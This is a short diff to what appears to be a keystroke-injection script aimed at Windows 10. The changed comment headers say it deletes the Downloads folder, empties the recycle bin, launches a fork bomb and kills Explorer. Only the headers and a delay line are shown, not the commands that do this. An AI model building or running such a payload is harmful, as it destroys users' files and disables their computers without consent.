@@ -1,4 +1,7 @@
-REM silly script to kill the computer :lol:
+REM Target-OS: Windows 10
+REM Title: Deadly script to kill windows (If you're using windows, you kinda deserve this)
+REM Author: Zek-C
+REM Description: Deletes everything in the downloads directory, removes it all from the recycle bin, then fork bombs and kills the explorer.
 DELAY 100
 REM ---------------------------------------------------------------------------------------------------------------------------------
 REM fork bomb!11!!!
